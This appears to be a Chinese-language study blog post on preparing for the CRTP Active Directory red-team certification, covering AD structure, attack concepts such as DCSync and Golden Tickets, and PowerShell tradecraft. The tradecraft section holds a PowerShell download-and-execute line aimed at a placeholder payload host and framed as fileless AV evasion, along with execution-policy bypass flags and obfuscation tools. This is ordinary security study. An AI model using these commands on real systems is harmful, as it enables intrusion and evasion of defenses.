---
title: CRTP 學習準備與策略規劃
date: 2026-02-21
categories:
  - 紅隊
tags : 
  - CRTP
---

## 前言
<br>
CRTP（Certified Red Team Professional）是由 Altered Security 推出的紅隊證照，核心聚焦在 Active Directory 內網攻擊技術。

如果用一句話概括：

```bash=
CRTP 是一張專門針對 AD 攻擊路徑與權限濫用技術的證照。
```

在過去的實戰經驗中，內網滲透往往是透過既有漏洞取得初始跳板，例如利用 CVE 進入主機後，直接開始橫向移動與權限提升，最終目標通常也是指向 Active Directory。
整體流程大致為：

```bash=
1day CVE → Webshell → RDP → 關閉防護機制 → 工具利用 → 橫向移動 → 進入 AD
```
這種打法屬於高度結果導向的實戰流程。任務能完成、目標能達成，但回頭檢視會發現，對於 AD 架構本身的設計邏輯、權限模型以及認證機制，理解多半停留在操作層，而非系統層。思考後發現，最大的差異是軍中通常是以目標導向為主，與其只依賴工具與既有手法，不如回頭把 AD 的核心知識與攻擊原理重新整理一次。最近剛好有兩位朋友對 CRTP 感興趣，提議一起準備這張證照，於是決定花時間系統化補齊這一塊。

### CRTP 學習資源與流程

官方網址 : 

```bash= 
https://www.enterprisesecurity.io/
```

成功登入後，可在 Dashboard 中看到 `Attacking and Defending Active Directory Lab - CRTP` 訂閱 Lab。

主要功能區包含：
- Lab Details
- Lab Manual
- Certification Exam
- Flag Verification
- Lab Material
- How to use Discord
- FAQs

其中最核心的學習資源集中在 `Lab Manual`，內容涵蓋課程影片、PDF 教材與相關工具包，是整套 CRTP 的知識主體，其他區塊則偏向環境說明、考試資訊與實驗室操作輔助。

![CRTP-Lab Material](/img/Material.png)

基本學習思路 : 

```bash=
Course Videos
（快速理解整體架構）
        ↓
Lab Connection Guide
（解決 Lab 連線問題）        
        ↓
Access Lab Material
（Lab 驗證）
        ↓
Walkthrough Videos
（僅在卡關時使用）
```

整體原則為：

```bash=
先建立全局架構，再透過 Lab 驗證理解，Walkthrough 僅作為輔助，而非主要學習來源。
```

### 學習效率優化

#### 雙語字幕輔助流程

CRTP 課程皆為全英文解說、無中文字幕，單純硬聽其實效率不高。與其反覆倒帶，不如把問題工程化處理。因此結合 Whisper 與 ChatGPT，先將影片轉為字幕，再進行翻譯與結構化整理，建立一套雙語輔助學習流程。保留技術術語原文，同時提升理解效率。後續也會將整個流程封裝成工具，放上 GitHub，並考慮導入 CI/CD 或容器化，方便長期維護與團隊使用。

因此建立以下流程：

```bash=
Whisper → 產生 SRT → ChatGPT 翻譯 → 結構化整理 → 建立雙語學習素材
```

##### 環境準備

安裝 Whisper :

```bash=
pip install -U openai-whisper
pip install torch
```

執行 Whisper : 

```bash=
Whisper
```

![Whisper](/img/Whisper.png)

下載 full_build.7z 並將 `ffmpeg.exe` 加入環境變數：

```bash=
https://www.gyan.dev/ffmpeg/builds/
```

![ffmpeg](/img/ffmpeg.png)

批量將所有 `.mp4` 檔案轉成 `.srt` 檔案，並存放在 `Course_output_en` 資料夾中 :

```bash= 
for %f in (*.mp4) do whisper "%f" --model small --language English --output_dir Course_output_en --output_format srt
```

![批量轉 srt 檔案](/img/srt.png)

轉換時間較長，後續可研究更高效處理方式。

![srt_en](/img/srt_en.png)

接著透過自製工具批量翻譯字幕：

```bash=
https://github.com/zxc7528064/SRT-Translator
```

翻譯後生成 `srt_zh` 檔案，並確認時間軸未發生錯位。

![srt_cn](/img/srt_cn.png)

實際匯入後，字幕與時間同步正常，即可正式進入學習階段。

![sucess_srt_zn](/img/sucess_srt_zn.png)

### Active Directory 攻擊框架

待畫心智圖

### Module 1 
- Introduction to Active Directory and Attack Methodology
- Offensive PowerShell and .NET tradecraft
- Domain Enumeration

![AD_image](/img/AD_image.png)

AD 的核心功能，它提供三大核心能力：
- Manageability（集中管理）
- Security（驗證與授權）
- Interoperability（跨系統整合）

幾乎所有 Windows Server、Client、Application、Email、Network Device 都圍繞 AD 運作。

重點：

```bash=
控制 AD = 控制整個企業環境
```

理解 AD 的結構框架（mental model）

```bash=
Domain
   ↓
Schema (定義有哪些 ObjectClass 與 Attribute)
   ↓
Object Class (定義物件類型)
   ↓
Object (實體資料)
   ├── Attributes (資料)
   └── Security Descriptor (ACL 權限)
```

Schema 與物件屬性 ： Active Directory 本質上是一個「物件導向的目錄資料庫」。

在 AD 中，所有資源都以「物件（Object）」的形式存在，例如：

- User
- Computer
- Group
- Organizational Unit (OU)
- Domain Controller
- Service Account
- GPO

每個物件都包含多個「屬性（Attribute）」，例如：

- sAMAccountName
- userPrincipalName
- memberOf
- objectSID
- servicePrincipalName

| 攻擊類型                   | 關鍵屬性                               | 真正本質              |
| ---------------------- | ---------------------------------------- | ----------------- |
| Kerberoasting          | servicePrincipalName                     | 可請求 TGS (可讀 SPN)  |
| SPN Abuse              | servicePrincipalName                     | 可寫 SPN            |
| Constrained Delegation | msDS-AllowedToDelegateTo                 | 可控制委派目標           |
| RBCD                   | msDS-AllowedToActOnBehalfOfOtherIdentity | 可寫 delegation ACL |
| ACL Abuse              | nTSecurityDescriptor                     | 可改物件權限            |

重點：
```bash=
多數 AD 攻擊建立在「物件屬性 + ACL 權限機制」之上。
```

Domain (網域) : 

公司內部帳號與電腦的管理範圍。

- 每個 Domain 擁有獨立的使用者、電腦與群組物件（User、Computer、Group、Service Account），這些物件都儲存在該 Domain 的 AD 資料庫（NTDS.dit）中。
- Domain 由一或多台 Domain Controller（DC）維護，負責儲存 AD 資料庫（NTDS.dit）、驗證使用者身分與發放存取權限。
- 預設使用 Kerberos 作為主要驗證機制，在某些情況下（例如舊系統或 SPN 解析失敗）會回退至 NTLM。

Domain 內部通常共享：
- 身份資料庫：所有帳號與群組資訊儲存在 AD 物件中。
- 安全政策（Security Policy）：密碼長度、複雜度、帳號鎖定策略等。
- 群組原則（GPO）：集中套用系統設定與安全設定至電腦與使用者。
- 信任關係（Trust Relationship）：允許跨 Domain 或跨 Forest 的身份驗證與資源存取。

重點：

```bash=
MS-DRSR : 
是 Domain Controller 之間用來同步 Active Directory 資料的官方協定。

Active Directory
      ↓
Replication 機制
      ↓
MS-DRSR 協定
      ↓
DRSUAPI 介面
      ↓
物件屬性資料同步

DCSync：
- 濫用 Directory Replication（目錄複寫）權限，透過 MS-DRSR（DRSUAPI）複寫介面向 Domain Controller，請求帳號屬性資料，可取得 NTLM hash、Kerberos 金鑰與 KRBTGT hash。

DCShadow：
- 濫用 AD 複寫機制，暫時將攻擊主機註冊為一台 Domain Controller，注入惡意物件屬性變更，並透過正常 replication 流程推送至其他 DC。

控制 KRBTGT hash = 可偽造 Kerberos Golden Ticket，偽造任意使用者身份（Golden Ticket），可以「假裝成任何人」，而整個網域都會相信。
```

Forest（森林）:

AD 架構的最高層級。

![Forest](/img/Forest.png)

包含：
- 多個 Domain
- 共用同一個 Schema（所有 Domain 的資料結構都必須一致）
- 共用全域目錄（Global Catalog）
 
重點 :
```bash=
Active Directory 森林權限與信任模型 : 

森林（Forest）－最高邏輯邊界
│
├── 架構分割區（Schema Partition）        ← 整個森林共用
├── 設定分割區（Configuration Partition） ← 整個森林共用
├── 全域目錄（Global Catalog）
│
├── 森林根網域（Forest Root Domain）
│      ├── 網域系統管理員（Domain Admins）
│      └── 企業系統管理員（Enterprise Admins）
│              ↑
│              └── 存在於根網域，但擁有森林層級權限
│
├── 子網域 A
│      └── 網域系統管理員（Domain Admins）
│
└── 子網域 B
       └── 網域系統管理員（Domain Admins）

同一 Forest 內的 Domain 之間預設存在雙向、可傳遞的信任關係（Transitive Trust）：
Domain A ↔ Domain B ↔ Domain C
        ↑______________↑
         自動形成傳遞信任
- 使用者可跨 Domain 存取資源
- 可將不同 Domain 的帳號加入其他 Domain 的群組
- 可進行跨網域授權控制

Enterprise Admins 群組擁有 Forest 層級的最高權限，可管理整個 Forest 的 Schema、Configuration 與所有 Domain 的關鍵設定。
- Enterprise Admins
```

---

在 Active Directory 內網滲透中，PowerShell 與 .NET 是最核心的攻擊載體。

- 理解 PowerShell 在 AD 攻擊中的角色
- 理解 Windows 環境的偵測面
- 理解何時應使用 PowerShell、何時應改用 .NET Binary

為什麼 PowerShell 是 AD 攻擊核心載體 ?

PowerShell 具備：

- 預設安裝於 Windows 系統
- 原生 .NET 支援
- PowerShell 可直接跟 AD 交互（查資料、改資料，而不需要額外工具）。
- 支援記憶體執行
- 可直接調用 Windows API

在 AD 內網滲透中，幾乎所有 Enumeration 行為都可透過 PowerShell 完成：

- 列出 User / Group / Computer
- 查詢 SPN
- 查詢 ACL
- 查詢 Delegation
- 查詢 Trust

AD 模組與基本操作

載入 AD 模組 :

```bash=
Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
Get-Command -Module ActiveDirectory
```

重點 : 
- 使用 AD 相關 cmdlet
- 進行 Domain Enumeration
- 查詢 user / group / SPN / ACL

記憶體執行（Memory Execution）

```bash=
iex (New-Object Net.WebClient).DownloadString('http://www.webserver/payload.ps1')
```

重點：
- 記憶體載入（fileless execution）
- 不落地執行腳本
- 減少檔案型 AV 偵測

PowerShell Detection Surface（偵測面）

理解防禦面，才能理解攻擊面。

```bash=
System-wide transcription
  - 記錄整個 PowerShell 操作過程

Script Block Logging
  - 會把「還原後的實際 script 內容」記錄下來

AMSI (AntiMalware Scan Interface)
  - 將腳本內容送給 AV 掃描

Constrained Language Mode (CLM)
  - 限制 PowerShell 功能
  - 通常搭配 AppLocker / WDAC
```

Execution Policy（執行策略）

常見參數 :

```bash= 
powershell -ep bypass
powershell -c <cmd>
powershell -encodedcommand <base64>
或在當前程序中：
Set-ExecutionPolicy Bypass -Scope Process
```

重點：
- 它只是防止誤執行腳本
- 真正的限制來自 AMSI / CLM / AV

Tradecraft 不是工具清單，而是：

- 目標環境是否啟用 Script Block Logging？
- 是否部署 EDR？
- 是否開啟 CLM？
- 是否允許 PowerShell 遠端執行？
- 是否應改用 .NET Binary？

PowerShell 本質是 .NET。

在高監控環境中，可能改用：
- 直接撰寫 C# 工具
- 使用 .NET API 操作 LDAP
- 減少 PowerShell 特徵

常見策略：
- Source Code Obfuscation
- 字串混淆
- API 間接調用
- 編譯為獨立 Binary

混淆與偵測研究工具（研究用途）

這些工具的價值在於理解偵測邏輯，而非盲目繞過。

- AMSITrigger → 測試哪段程式碼觸發 AMSI
- DefenderCheck → 測試哪段內容被 Defender 標記
- Invoke-Obfuscation → PowerShell 混淆框架
- ConfuserEx → .NET 混淆工具

---


### Module 2 
- Local Privilege Escalation
- Lateral Movement
- Domain Privilege Escalation

### Module 3
- Domain Persistensce
- Cross Trust Attacks

### Module 4
- Bypass Defenses (MDE and MDI)
- Monitoring and Detections

本文先記錄學習前的策略規劃，後續將依照實際進度拆解各模組內容。

## Lab Methodology - Assume Breach (實驗室方法論)

核心精神： 
在滲透測試中預設攻擊者已取得內網初始立足點（Initial Foothold），接著評估其是否能透過：
```bash=
- 權限濫用 (Privilege Abuse)
- 憑證竊取 (Credential Theft)
- 橫向移動 (Lateral Movement)
- 權限提升 (Privilege Escalation)
```

最終達成：控制整個 Active Directory 網域環境（Domain Dominance）

Lab 入口資訊
- Portal URL: `https://enterprisesecurity.io`
- 登入後可查看：
  - 訂閱開始與結束時間
  - Lab 存取剩餘時間
  - 最近一次考試嘗試時間

重點 : 
- 最少 30 天存取權限
- 若時間異常需立即確認
- Lab 時間與考試資格直接相關


區域選擇 (Region Selection)
- North America
- Europe
- East Asia / Pacific

原則 : 
- 依地理位置選擇最近區域
- 降低延遲 (Latency)
- 確保操作流暢度

## 總結